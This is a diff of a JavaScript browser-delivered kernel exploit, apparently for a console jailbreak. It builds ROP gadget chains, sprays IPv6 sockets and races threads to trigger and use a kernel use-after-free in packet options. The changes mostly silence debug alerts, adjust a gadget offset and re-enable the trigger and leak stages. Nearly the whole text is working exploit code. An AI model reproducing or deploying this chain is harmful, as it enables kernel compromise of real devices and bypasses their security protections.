@@ -108,7 +108,7 @@ let gadgetmap = {
   "mov [rdi], rax":  0x00008c2a, // 48 89 07 C3
   "mov [rdi], eax":  0x00008c2b, // 89 07 C3
   "mov [rdi], rsi":  0x000133e0, // 48 89 37 C3
-  "cmp [rcx], edi":  0x0010da31, // 39 39 C3
+  "cmp [rcx], edi":  0x000d2401, // 39 39 C3
 
   "cmp [rcx], eax" : 0x0063FD12, // 39 01 C3
   "setne al":        0x00003340, // 0F 95 C0 C3
@@ -838,7 +838,7 @@ function setupRW() {
 	//debug_log("new rop");
 	try{
 		if (chain.syscall(23, 0).low != 0x0) {
-			alert("try stage3");	
+			//alert("try stage3");	
 			try {
 				stage3();
 			} catch (e) {
@@ -994,7 +994,7 @@ function stage3() {
     size_of_fix_these_sockets
   );
 
-  alert("after malloc");
+  //alert("after malloc");
 
   const triggered = var_memory;
   const valid_pktopts = triggered.add32(size_of_triggered);
@@ -1029,7 +1029,7 @@ function stage3() {
   var socketops;
   var kernel_base;
   
-  alert("after const decl");
+  //alert("after const decl");
 
   prim.write8(valid_pktopts.add32(0x0), 0x14);
   prim.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
@@ -1048,7 +1048,7 @@ function stage3() {
 
   prim.write8(pktinfo_buffer_len, 0x14);
 
-  alert("create_sockets!");
+  //alert("create_sockets!");
   //create sockets
   const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
   const target_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
@@ -1074,7 +1074,7 @@ function stage3() {
   
   chain.run();
   
-  alert("run chain!");
+  //alert("run chain!");
 	
   const spray_sockets = array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
   const spray_socks_tclasses = array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);
@@ -1096,7 +1096,7 @@ function stage3() {
 
   fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x0] = master_socket;
   fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x1] = spare_socket;
-  alert("master and slave sockets!");
+  //alert("master and slave sockets!");
 
   for (var i = 0; i < 10; i++) {
     prim.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
@@ -1105,14 +1105,10 @@ function stage3() {
 
   var thr1_start;
   var thr1_ctrl;
-  alert("thread start!");
+  //alert("thread start!");
 
   const thread1 = chain.spawn_thread("thread1", function (new_thr) {
-	 
-	  
-    const loop_start = new_thr.get_rsp();
-	alert("before trigger_condition");
-    
+	const loop_start = new_thr.get_rsp();
 	const trigger_condition = new_thr.create_equal_branch(triggered, 1);
 
 	
@@ -1121,19 +1117,18 @@ function stage3() {
     new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
     const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);
 
-	alert("before overlap_false");
+	
     const overlap_false = new_thr.get_rsp();
     new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
-    new_thr.push(window.gadgets["pop rdi"]);
+    new_thr.push(gadgets["pop rdi"]);
     var dest_idx = new_thr.pushSymbolic();
-    new_thr.push(window.gadgets["pop rsi"]);
+    new_thr.push(gadgets["pop rsi"]);
     var src_idx = new_thr.pushSymbolic();
-    new_thr.push(window.gadgets["mov [rdi], rsi"]);
+    new_thr.push(gadgets["mov [rdi], rsi"]);
     var l1 = new_thr.get_rsp();
-    new_thr.push(window.gadgets["pop rsp"]);
+    new_thr.push(gadgets["pop rsp"]);
     var l2 = new_thr.get_rsp();
     new_thr.push(0x43434343);
-	alert("after 434343");
     new_thr.finalizeSymbolic(dest_idx, l2);
     new_thr.finalizeSymbolic(src_idx, l1);
     thr1_start = loop_start;
@@ -1141,24 +1136,23 @@ function stage3() {
 
     const overlap_true = new_thr.get_rsp();
     new_thr.push_write8(triggered, 1);
-	alert("after overlap_true");
+	
     const triggered_true = new_thr.get_rsp();
     new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
-	alert("set_branch_points");
-    new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
-    new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
 	
+	new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
+    new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
   });
 
   //boys dont race too fast now, kthx.
-  alert("boys dont race too fast now, kthx.");
+  //alert("boys dont race too fast now, kthx.");
 
   var me = chain.call(libKernelBase.add32(OFFSET_lk_pthread_self));
   var prio = malloc(0x8);
   prim.write4(prio, 0x100);
   var r = chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
   
-  alert("setting threads... 1");
+  //alert("setting threads... 1");
 
   const thread3 = new rop(); {
     //main loop
@@ -1190,11 +1184,9 @@ function stage3() {
     thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
   }
   //trigger uaf
-  alert("trigger uaf");
-  /*
+  //alert("trigger uaf");
+  
   thread1();
-  alert("thread 1");
-
   thread3.run();
 
   function find_socket_overlap() {
@@ -1370,22 +1362,28 @@ function stage3() {
   }
       
   //lower priority
-  alert("//lower priority");
+  //alert("//lower priority");
+
   prim.write4(prio, 0x1FF);
   chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
   //find uaf
-  debug_log("//find uaf");
+  //alert("//find uaf");
   find_socket_overlap();
-  debug_log("//play with uaf");
+  //alert("//play with uaf");
   //play with uaf
   fake_pktopts(0);
   leak_sockets[overlapped_socket_idx] = spare_socket;
   //leak shit
-  debug_log("//leak shit");
+  //alert("//leak shit");
   leak_pktopts();
-  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
+	try{  
+		fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
+	}catch(e){
+		alert(e);
+	}
   //find vvictim
-  debug_log("//find victim");
+  //alert("//find victim");
+/*  
   find_slave();
   brute_force_kernel_map();
   const proc = find_proc();
@@ -1520,7 +1518,7 @@ function stage3() {
   chain.syscall(54, target_socket, 0x20001111, 0);
   //alert("executed in kernel");
   //prim.write8(0, 0);
-  */
+*/  
 }
 
 function read(addr, length) {
